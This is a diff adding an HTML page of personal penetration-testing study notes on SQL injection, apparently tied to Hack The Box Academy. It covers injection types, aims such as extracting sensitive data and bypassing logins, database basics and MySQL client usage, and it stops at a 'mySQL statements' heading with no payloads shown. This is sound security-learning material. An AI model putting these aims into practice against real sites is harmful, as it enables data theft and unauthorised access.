@@ -1,0 +1,1147 @@
+<!doctype html>
+<html class="no-js" lang="en" data-content_root="">
+  <head><meta charset="utf-8"/>
+    <meta name="viewport" content="width=device-width,initial-scale=1"/>
+    <meta name="color-scheme" content="light dark"><meta name="viewport" content="width=device-width, initial-scale=1" />
+
+    <!-- Google tag (gtag.js) -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-2TCTE0JE23"></script>
+    <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+        gtag('config', 'G-2TCTE0JE23');
+    </script>
+        <link href="../../../_static/lazer_fox.png" sizes="300x300" rel="icon" type="image/png"><link rel="index" title="Index" href="../../../genindex.html" /><link rel="search" title="Search" href="../../../search.html" /><link rel="next" title="Web Apps" href="../webapp/webapp.html" /><link rel="prev" title="Windows OS Fundamentals" href="../os-fundamentals/windows-fundamentals/windows-fundamentals.html" />
+
+    <!-- Generated with Sphinx 7.1.2 and Furo 2023.08.19 -->
+        <title>SQLi - blnkn&#39;s notes</title>
+      <link rel="stylesheet" type="text/css" href="../../../_static/pygments.css?v=a746c00c" />
+    <link rel="stylesheet" type="text/css" href="../../../_static/styles/furo.css?v=135e06be" />
+    <link rel="stylesheet" type="text/css" href="../../../_static/styles/furo-extensions.css?v=36a5483c" />
+    
+    
+
+
+<style>
+  body {
+    --color-code-background: #f8f8f8;
+  --color-code-foreground: black;
+  
+  }
+  @media not print {
+    body[data-theme="dark"] {
+      --color-code-background: #202020;
+  --color-code-foreground: #d0d0d0;
+  
+    }
+    @media (prefers-color-scheme: dark) {
+      body:not([data-theme="light"]) {
+        --color-code-background: #202020;
+  --color-code-foreground: #d0d0d0;
+  
+      }
+    }
+  }
+</style></head>
+  <body>
+    
+    <script>
+      document.body.dataset.theme = localStorage.getItem("theme") || "auto";
+    </script>
+    
+
+<svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
+  <symbol id="svg-toc" viewBox="0 0 24 24">
+    <title>Contents</title>
+    <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 1024 1024">
+      <path d="M408 442h480c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8H408c-4.4 0-8 3.6-8 8v56c0 4.4 3.6 8 8 8zm-8 204c0 4.4 3.6 8 8 8h480c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8H408c-4.4 0-8 3.6-8 8v56zm504-486H120c-4.4 0-8 3.6-8 8v56c0 4.4 3.6 8 8 8h784c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8zm0 632H120c-4.4 0-8 3.6-8 8v56c0 4.4 3.6 8 8 8h784c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8zM115.4 518.9L271.7 642c5.8 4.6 14.4.5 14.4-6.9V388.9c0-7.4-8.5-11.5-14.4-6.9L115.4 505.1a8.74 8.74 0 0 0 0 13.8z"/>
+    </svg>
+  </symbol>
+  <symbol id="svg-menu" viewBox="0 0 24 24">
+    <title>Menu</title>
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+      stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather-menu">
+      <line x1="3" y1="12" x2="21" y2="12"></line>
+      <line x1="3" y1="6" x2="21" y2="6"></line>
+      <line x1="3" y1="18" x2="21" y2="18"></line>
+    </svg>
+  </symbol>
+  <symbol id="svg-arrow-right" viewBox="0 0 24 24">
+    <title>Expand</title>
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+      stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather-chevron-right">
+      <polyline points="9 18 15 12 9 6"></polyline>
+    </svg>
+  </symbol>
+  <symbol id="svg-sun" viewBox="0 0 24 24">
+    <title>Light mode</title>
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+      stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" class="feather-sun">
+      <circle cx="12" cy="12" r="5"></circle>
+      <line x1="12" y1="1" x2="12" y2="3"></line>
+      <line x1="12" y1="21" x2="12" y2="23"></line>
+      <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+      <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+      <line x1="1" y1="12" x2="3" y2="12"></line>
+      <line x1="21" y1="12" x2="23" y2="12"></line>
+      <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+      <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+    </svg>
+  </symbol>
+  <symbol id="svg-moon" viewBox="0 0 24 24">
+    <title>Dark mode</title>
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+      stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" class="icon-tabler-moon">
+      <path stroke="none" d="M0 0h24v24H0z" fill="none" />
+      <path d="M12 3c.132 0 .263 0 .393 0a7.5 7.5 0 0 0 7.92 12.446a9 9 0 1 1 -8.313 -12.454z" />
+    </svg>
+  </symbol>
+  <symbol id="svg-sun-half" viewBox="0 0 24 24">
+    <title>Auto light/dark mode</title>
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+      stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" class="icon-tabler-shadow">
+      <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+      <circle cx="12" cy="12" r="9" />
+      <path d="M13 12h5" />
+      <path d="M13 15h4" />
+      <path d="M13 18h1" />
+      <path d="M13 9h4" />
+      <path d="M13 6h1" />
+    </svg>
+  </symbol>
+</svg>
+
+<input type="checkbox" class="sidebar-toggle" name="__navigation" id="__navigation">
+<input type="checkbox" class="sidebar-toggle" name="__toc" id="__toc">
+<label class="overlay sidebar-overlay" for="__navigation">
+  <div class="visually-hidden">Hide navigation sidebar</div>
+</label>
+<label class="overlay toc-overlay" for="__toc">
+  <div class="visually-hidden">Hide table of contents sidebar</div>
+</label>
+
+
+
+<div class="page">
+  <header class="mobile-header">
+    <div class="header-left">
+      <label class="nav-overlay-icon" for="__navigation">
+        <div class="visually-hidden">Toggle site navigation sidebar</div>
+        <i class="icon"><svg><use href="#svg-menu"></use></svg></i>
+      </label>
+    </div>
+    <div class="header-center">
+      <a href="../../../index.html"><div class="brand">blnkn's notes</div></a>
+    </div>
+    <div class="header-right">
+      <div class="theme-toggle-container theme-toggle-header">
+        <button class="theme-toggle">
+          <div class="visually-hidden">Toggle Light / Dark / Auto color theme</div>
+          <svg class="theme-icon-when-auto"><use href="#svg-sun-half"></use></svg>
+          <svg class="theme-icon-when-dark"><use href="#svg-moon"></use></svg>
+          <svg class="theme-icon-when-light"><use href="#svg-sun"></use></svg>
+        </button>
+      </div>
+      <label class="toc-overlay-icon toc-header-icon" for="__toc">
+        <div class="visually-hidden">Toggle table of contents sidebar</div>
+        <i class="icon"><svg><use href="#svg-toc"></use></svg></i>
+      </label>
+    </div>
+  </header>
+  <aside class="sidebar-drawer">
+    <div class="sidebar-container">
+      
+      <div class="sidebar-sticky"><a class="sidebar-brand" href="../../../index.html">
+  
+  <div class="sidebar-logo-container">
+    <img class="sidebar-logo" src="../../../_static/lazer_fox.png" alt="Logo"/>
+  </div>
+  
+  <span class="sidebar-brand-text">blnkn's notes</span>
+  
+</a><form class="sidebar-search-container" method="get" action="../../../search.html" role="search">
+  <input class="sidebar-search" placeholder="Search" name="q" aria-label="Search">
+  <input type="hidden" name="check_keywords" value="yes">
+  <input type="hidden" name="area" value="default">
+</form>
+<div id="searchbox"></div><div class="sidebar-scroll"><div class="sidebar-tree">
+  <p class="caption" role="heading"><span class="caption-text">Contents:</span></p>
+<ul class="current">
+<li class="toctree-l1 current has-children"><a class="reference internal" href="../../htb.html">Hack The Box</a><input checked="" class="toctree-checkbox" id="toctree-checkbox-1" name="toctree-checkbox-1" role="switch" type="checkbox"/><label for="toctree-checkbox-1"><div class="visually-hidden">Toggle navigation of Hack The Box</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul class="current">
+<li class="toctree-l2 current has-children"><a class="reference internal" href="../academy.html">Academy</a><input checked="" class="toctree-checkbox" id="toctree-checkbox-2" name="toctree-checkbox-2" role="switch" type="checkbox"/><label for="toctree-checkbox-2"><div class="visually-hidden">Toggle navigation of Academy</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul class="current">
+<li class="toctree-l3 has-children"><a class="reference internal" href="../active-directory/active-directory.html">Active Directory</a><input class="toctree-checkbox" id="toctree-checkbox-3" name="toctree-checkbox-3" role="switch" type="checkbox"/><label for="toctree-checkbox-3"><div class="visually-hidden">Toggle navigation of Active Directory</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l4"><a class="reference internal" href="../active-directory/ad/ad.html">Active Directory</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../active-directory/ad/ad.html#user-account-control-values">User Account Control Values</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../active-directory/kerberos/kerberos.html">Kerberos</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../active-directory/windows-auth/windows-auth.html">Windows Authentication</a></li>
+</ul>
+</li>
+<li class="toctree-l3 has-children"><a class="reference internal" href="../buffer-overflows/buffer-overflows.html">Buffer Overflows</a><input class="toctree-checkbox" id="toctree-checkbox-4" name="toctree-checkbox-4" role="switch" type="checkbox"/><label for="toctree-checkbox-4"><div class="visually-hidden">Toggle navigation of Buffer Overflows</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l4"><a class="reference internal" href="../buffer-overflows/linux-buffer-overflows/linux-buffer-overflows.html">Linux Buffer Overflows</a></li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="../hashcat/hashcat.html">Hashcat</a></li>
+<li class="toctree-l3 has-children"><a class="reference internal" href="../os-fundamentals/os-fundamentals.html">OS Fundamentals</a><input class="toctree-checkbox" id="toctree-checkbox-5" name="toctree-checkbox-5" role="switch" type="checkbox"/><label for="toctree-checkbox-5"><div class="visually-hidden">Toggle navigation of OS Fundamentals</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l4"><a class="reference internal" href="../os-fundamentals/windows-fundamentals/windows-fundamentals.html">Windows OS Fundamentals</a></li>
+</ul>
+</li>
+<li class="toctree-l3 current current-page"><a class="current reference internal" href="#">SQLi</a></li>
+<li class="toctree-l3"><a class="reference internal" href="../webapp/webapp.html">Web Apps</a></li>
+</ul>
+</li>
+<li class="toctree-l2 has-children"><a class="reference internal" href="../../machines/machines.html">Lab Machines</a><input class="toctree-checkbox" id="toctree-checkbox-6" name="toctree-checkbox-6" role="switch" type="checkbox"/><label for="toctree-checkbox-6"><div class="visually-hidden">Toggle navigation of Lab Machines</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l3 has-children"><a class="reference internal" href="../../machines/hard/hard.html">Hard</a><input class="toctree-checkbox" id="toctree-checkbox-7" name="toctree-checkbox-7" role="switch" type="checkbox"/><label for="toctree-checkbox-7"><div class="visually-hidden">Toggle navigation of Hard</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l4"><a class="reference internal" href="../../machines/hard/snoopy/snoopy.html">Snoopy</a></li>
+</ul>
+</li>
+<li class="toctree-l3 has-children"><a class="reference internal" href="../../machines/medium/medium.html">Medium</a><input class="toctree-checkbox" id="toctree-checkbox-8" name="toctree-checkbox-8" role="switch" type="checkbox"/><label for="toctree-checkbox-8"><div class="visually-hidden">Toggle navigation of Medium</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l4"><a class="reference internal" href="../../machines/medium/ambassador/ambassador.html">Ambassador</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../machines/medium/authority/authority.html">Authority</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../machines/medium/awkward/awkward.html">Awkward</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../machines/medium/faculty/faculty.html">Faculty</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../machines/medium/forgot/forgot.html">Forgot</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../machines/medium/format/format.html">Format</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../machines/medium/health/health.html">Health</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../machines/medium/jupiter/jupiter.html">Jupiter</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../machines/medium/manager/manager.html">Manager</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../machines/medium/mentor/mentor.html">Mentor</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../machines/medium/only4you/only4you.html">Only4you</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../machines/medium/outdated/outdated.html">Outdated</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../machines/medium/sandworm/sandworm.html">Sandworm</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../machines/medium/scrambled/scrambled.html">Scrambled</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../machines/medium/shared/shared.html">Shared</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../machines/medium/updown/updown.html">Updown</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../machines/medium/zipping/zipping.html">Zipping</a></li>
+</ul>
+</li>
+<li class="toctree-l3 has-children"><a class="reference internal" href="../../machines/easy/easy.html">Easy</a><input class="toctree-checkbox" id="toctree-checkbox-9" name="toctree-checkbox-9" role="switch" type="checkbox"/><label for="toctree-checkbox-9"><div class="visually-hidden">Toggle navigation of Easy</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l4"><a class="reference internal" href="../../machines/easy/analytics/analytics.html">Analytics</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../machines/easy/busqueda/busqueda.html">Busqueda</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../machines/easy/codify/codify.html">Codify</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../machines/easy/inject/inject.html">Inject</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../machines/easy/keeper/keeper.html">Keeper</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../machines/easy/metatwo/metatwo.html">Meta two</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../machines/easy/monitorstwo/monitorstwo.html">Monitors two</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../machines/easy/pc/pc.html">Pc</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../machines/easy/photobomb/photobomb.html">Photobomb</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../machines/easy/pilgrimage/pilgrimage.html">Pilgrimage</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../machines/easy/precious/precious.html">Precious</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../machines/easy/red_panda/red_panda.html">Red panda</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../machines/easy/sau/sau.html">Sau</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../machines/easy/shoppy/shoppy.html">Shoppy</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../machines/easy/soccer/soccer.html">Soccer</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../machines/easy/stocker/stocker.html">Stocker</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../machines/easy/support/support.html">Support</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../machines/easy/topology/topology.html">Topology</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../machines/easy/trick/trick.html">Trick</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li class="toctree-l1 has-children"><a class="reference internal" href="../../../pg/pg.html">Proving Grounds</a><input class="toctree-checkbox" id="toctree-checkbox-10" name="toctree-checkbox-10" role="switch" type="checkbox"/><label for="toctree-checkbox-10"><div class="visually-hidden">Toggle navigation of Proving Grounds</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l2"><a class="reference internal" href="../../../pg/ha_natraj/ha_natraj.html">Ha Natraj</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../pg/sunset_decoy/sunset_decoy.html">Sunset Decoy</a></li>
+</ul>
+</li>
+<li class="toctree-l1 has-children"><a class="reference internal" href="../../../dvwa/dvwa.html">DVWA</a><input class="toctree-checkbox" id="toctree-checkbox-11" name="toctree-checkbox-11" role="switch" type="checkbox"/><label for="toctree-checkbox-11"><div class="visually-hidden">Toggle navigation of DVWA</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l2"><a class="reference internal" href="../../../dvwa/sqli_blind/sqli_blind.html">Blind SQLi</a></li>
+</ul>
+</li>
+<li class="toctree-l1 has-children"><a class="reference internal" href="../../../other/other.html">Other</a><input class="toctree-checkbox" id="toctree-checkbox-12" name="toctree-checkbox-12" role="switch" type="checkbox"/><label for="toctree-checkbox-12"><div class="visually-hidden">Toggle navigation of Other</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l2"><a class="reference internal" href="../../../other/assembly/assembly.html">Assembly</a></li>
+<li class="toctree-l2 has-children"><a class="reference internal" href="../../../other/aws-ccp/aws-ccp.html">AWS-CCP</a><input class="toctree-checkbox" id="toctree-checkbox-13" name="toctree-checkbox-13" role="switch" type="checkbox"/><label for="toctree-checkbox-13"><div class="visually-hidden">Toggle navigation of AWS-CCP</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l3"><a class="reference internal" href="../../../other/aws-ccp/1-foundations-of-cloud-computing.html">Foundations of Cloud Computing</a></li>
+<li class="toctree-l3"><a class="reference internal" href="../../../other/aws-ccp/2-technology.html">Technologies</a></li>
+<li class="toctree-l3"><a class="reference internal" href="../../../other/aws-ccp/3-security-and-compliance.html">Security and Compliance</a></li>
+<li class="toctree-l3"><a class="reference internal" href="../../../other/aws-ccp/4-pricing-billing-and-governance.html">Pricing Billing and Governance</a></li>
+</ul>
+</li>
+<li class="toctree-l2"><a class="reference internal" href="../../../other/codebashing/codebashing.html">Codebashing</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../other/dba/dba.html">Database Administration</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../other/dorking/dorking.html">Google dork cheatsheet</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../other/empire/empire.html">Empire</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../other/hashes/hashes.html">Hashes</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../other/irssi/irssi.html">Irssi</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../other/metasploit/metasploit.html">Metasploit framework</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../other/nmap/nmap.html">Nmap</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../other/reconstructing-private-key/reconstructing-private-key.html">Reconstructing a Private Key</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../other/rfid/rfid.html">RFID</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../other/server-hardening/server-hardening.html">Server Hardening</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../other/shells/shells.html">Reverse Shells</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../other/stego/stego.html">Steganography</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../other/tcpdump-vuln/tcpdump-vuln.html">TCPdump</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../other/wordlists/wordlists.html">Making Custom Wordlists</a></li>
+<li class="toctree-l2 has-children"><a class="reference internal" href="../../../other/c/c.html">C</a><input class="toctree-checkbox" id="toctree-checkbox-14" name="toctree-checkbox-14" role="switch" type="checkbox"/><label for="toctree-checkbox-14"><div class="visually-hidden">Toggle navigation of C</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l3"><a class="reference internal" href="../../../other/c/execution-methods.html">C Execution methods</a></li>
+</ul>
+</li>
+<li class="toctree-l2"><a class="reference internal" href="../../../other/air-ungap/air-ungap.html">Air-Ungap</a></li>
+</ul>
+</li>
+</ul>
+
+</div>
+</div>
+
+      </div>
+      
+    </div>
+  </aside>
+  <div class="main">
+    <div class="content">
+      <div class="article-container">
+        <a href="#" class="back-to-top muted-link">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+            <path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8v12z"></path>
+          </svg>
+          <span>Back to top</span>
+        </a>
+        <div class="content-icon-container">
+          
+<div class="theme-toggle-container theme-toggle-content">
+            <button class="theme-toggle">
+              <div class="visually-hidden">Toggle Light / Dark / Auto color theme</div>
+              <svg class="theme-icon-when-auto"><use href="#svg-sun-half"></use></svg>
+              <svg class="theme-icon-when-dark"><use href="#svg-moon"></use></svg>
+              <svg class="theme-icon-when-light"><use href="#svg-sun"></use></svg>
+            </button>
+          </div>
+          <label class="toc-overlay-icon toc-content-icon" for="__toc">
+            <div class="visually-hidden">Toggle table of contents sidebar</div>
+            <i class="icon"><svg><use href="#svg-toc"></use></svg></i>
+          </label>
+        </div>
+        <article role="main">
+          <section id="sqli">
+<h1>SQLi<a class="headerlink" href="#sqli" title="Permalink to this heading">#</a></h1>
+<section id="injection-types">
+<h2>Injection types<a class="headerlink" href="#injection-types" title="Permalink to this heading">#</a></h2>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">HTTP</span> <span class="n">injection</span>
+<span class="n">Code</span> <span class="n">injection</span>
+<span class="n">Command</span> <span class="n">injection</span>
+<span class="n">SQL</span> <span class="n">injection</span>
+</pre></div>
+</div>
+</section>
+<section id="query-types">
+<h2>Query types<a class="headerlink" href="#query-types" title="Permalink to this heading">#</a></h2>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Stacked</span> <span class="n">queries</span>
+<span class="n">Union</span> <span class="n">queries</span>
+</pre></div>
+</div>
+</section>
+<section id="use-cases">
+<h2>Use cases<a class="headerlink" href="#use-cases" title="Permalink to this heading">#</a></h2>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Retrieve</span> <span class="n">secret</span><span class="o">/</span><span class="n">sensitive</span> <span class="n">information</span> <span class="kn">from</span> <span class="nn">the</span> <span class="n">database</span>
+<span class="n">Subvert</span> <span class="n">the</span> <span class="n">intended</span> <span class="n">web</span> <span class="n">application</span> <span class="n">logic</span> 
+<span class="n">ei</span> <span class="n">bypassing</span> <span class="n">login</span> <span class="n">without</span> <span class="n">passing</span> <span class="n">a</span> <span class="n">valid</span> <span class="n">pair</span> <span class="n">of</span> <span class="n">username</span> <span class="ow">and</span> <span class="n">password</span><span class="p">,</span> 
+<span class="ow">or</span> <span class="n">access</span> <span class="n">a</span> <span class="n">restricted</span> <span class="n">admin</span> <span class="n">panel</span>
+</pre></div>
+</div>
+</section>
+<section id="interactions">
+<h2>Interactions<a class="headerlink" href="#interactions" title="Permalink to this heading">#</a></h2>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Command</span><span class="o">-</span><span class="n">line</span> <span class="n">tools</span>
+<span class="n">Graphical</span> <span class="n">interfaces</span>
+<span class="n">APIs</span>
+</pre></div>
+</div>
+</section>
+<section id="features">
+<h2>Features<a class="headerlink" href="#features" title="Permalink to this heading">#</a></h2>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Concurrency</span>     <span class="n">Concurrent</span> <span class="n">interactions</span> <span class="n">succeed</span> <span class="n">without</span> <span class="n">corrupting</span> <span class="ow">or</span> <span class="n">losing</span> <span class="nb">any</span> <span class="n">data</span><span class="o">.</span>
+<span class="n">Consistency</span>     <span class="n">Data</span> <span class="n">remains</span> <span class="n">consistent</span> <span class="ow">and</span> <span class="n">valid</span> <span class="n">throughout</span> <span class="n">the</span> <span class="n">database</span><span class="o">.</span>
+<span class="n">Security</span>        <span class="n">Fine</span><span class="o">-</span><span class="n">grained</span> <span class="n">security</span> <span class="n">controls</span> <span class="n">through</span> <span class="n">user</span> <span class="n">authentication</span> <span class="ow">and</span> <span class="n">permissions</span><span class="o">.</span>
+<span class="n">Reliability</span>     <span class="n">It</span><span class="s1">&#39;s easy to backup databases and roll them back to a previous state in case of data loss or a breach.</span>
+<span class="n">SQL</span>             <span class="n">SQL</span> <span class="n">simplifies</span> <span class="n">user</span> <span class="n">interaction</span> <span class="k">with</span> <span class="n">the</span> <span class="n">database</span> <span class="k">with</span> <span class="n">an</span> <span class="n">intuitive</span> <span class="n">syntax</span> <span class="n">supporting</span> <span class="n">various</span> <span class="n">operations</span><span class="o">.</span>
+</pre></div>
+</div>
+</section>
+<section id="types">
+<h2>Types<a class="headerlink" href="#types" title="Permalink to this heading">#</a></h2>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">File</span><span class="o">-</span><span class="n">based</span>
+<span class="n">Graph</span> <span class="n">based</span>
+<span class="n">Key</span><span class="o">/</span><span class="n">Value</span> <span class="n">stores</span>
+<span class="n">Non</span><span class="o">-</span><span class="n">Relational</span> <span class="n">DBMS</span> <span class="p">(</span><span class="n">NoSQL</span><span class="p">)</span>
+<span class="n">Relational</span> <span class="n">DBMS</span> <span class="p">(</span><span class="n">RDBMS</span><span class="p">)</span>
+</pre></div>
+</div>
+</section>
+<section id="relational-databases">
+<h2>Relational databases<a class="headerlink" href="#relational-databases" title="Permalink to this heading">#</a></h2>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>Relational Databases - Data is stored in tables, rows, and columns. Each table can have unique keys, which can link tables together and create relationships between tables
+- Examples -&gt; Oracle, MySQL, MariaDB, MSQL, PostgreSQL, SQLite, Teradata, Hyve ...
+
+⧉   schema   The relationship between tables within a database is called a Schema
+🔑  key      Each table can have unique keys, which can link tables together and create relationships between tables
+☶   table    Collection of data
+⬇   column   Columns
+⮕   row      Rows
+▭   cell     Intersection of a row and a collumn
+
+         ╔════════╦════════╦════════╦════════╗
+         ║   id   ║  user  ║ first  ║ last   ║
+         ╠════════╬════════╬════════╬════════╣
+         ║   1    ║  admin ║ admin  ║ admin  ║
+         ╠════════╬════════╬════════╬════════╣
+         ║   2    ║  test  ║ test   ║ test   ║
+         ╠════════╬════════╬════════╬════════╣
+         ║   3    ║  sa    ║ super  ║ admin  ║
+         ╚════════╩════════╩════════╩════════╝
+             ⬆
+             🔑
+             ⬇
+╔════════╦════════╦════════╦════════╗
+║   id   ║  uid   ║ date   ║ content║
+╠════════╬════════╬════════╬════════╣
+║   1    ║  2     ║ 010121 ║ Welc.. ║
+╠════════╬════════╬════════╬════════╣
+║   2    ║  2     ║ 020121 ║ yoma.. ║
+╠════════╬════════╬════════╬════════╣
+║   3    ║  1     ║ 020121 ║ bruv.. ║
+╚════════╩════════╩════════╩════════╝
+</pre></div>
+</div>
+</section>
+<section id="non-relational-databases">
+<h2>Non-relational databases<a class="headerlink" href="#non-relational-databases" title="Permalink to this heading">#</a></h2>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>
+Key-Value     - Uses key-value pairs to store data in something like XML, YAML or JSON.
+              - Examples -&gt; MongoDB, Couchbase, Redis, etcd ...
+
+Document-Oriented    - Subcategory of Key-Value, focused on storing,
+                     - retrieving and managing document-oriented information,
+                     - also known as semi-structured data.
+                     - Examples -&gt; MongoDB, Couchbase, ElasticSearch ...
+
+Wide-Column   - Names and format of the columns can vary from row to row in the same table,
+              - can be interpreted as a two-dimensional key–value store.
+              - Examples -&gt; Cassandra, HBase, DataStax Astra/Luna, ClickHouse ...
+
+Graph  - Uses graph structures for semantic queries with nodes, edges,
+       - and properties to represent and store data.
+       - Examples -&gt; DataStax, SAP HANA, Teradata Aster, RedisGraph, Neo4j ...
+</pre></div>
+</div>
+</section>
+<section id="default-ports">
+<h2>Default ports<a class="headerlink" href="#default-ports" title="Permalink to this heading">#</a></h2>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="mi">3306</span> <span class="o">-</span> <span class="n">MySQL</span><span class="o">/</span><span class="n">MariaDB</span>
+</pre></div>
+</div>
+</section>
+<section id="documentation">
+<h2>Documentation<a class="headerlink" href="#documentation" title="Permalink to this heading">#</a></h2>
+<p><a class="reference external" href="https://dev.mysql.com/doc/refman/8.0/en/data-types.html">https://dev.mysql.com/doc/refman/8.0/en/data-types.html</a></p>
+</section>
+<section id="mysql-client-commands">
+<h2>Mysql client commands<a class="headerlink" href="#mysql-client-commands" title="Permalink to this heading">#</a></h2>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="o">-</span><span class="n">u</span>    <span class="n">user</span>
+<span class="o">-</span><span class="n">p</span>    <span class="n">password</span>
+<span class="o">-</span><span class="n">h</span>    <span class="n">host</span>
+<span class="o">-</span><span class="n">P</span>    <span class="n">port</span>
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>mysql<span class="w"> </span>-u<span class="w"> </span>root<span class="w"> </span>-p
+mysql<span class="w"> </span>-u<span class="w"> </span>root<span class="w"> </span>-P<span class="w"> </span><span class="m">3306</span><span class="w"> </span>-h<span class="w"> </span><span class="m">127</span>.0.0.1<span class="w"> </span>-ppassword
+</pre></div>
+</div>
+</section>
+<section id="mysql-statements">
+<h2>mySQL statements<a class="headerlink" href="#mysql-statements" title="Permalink to this heading">#</a></h2>
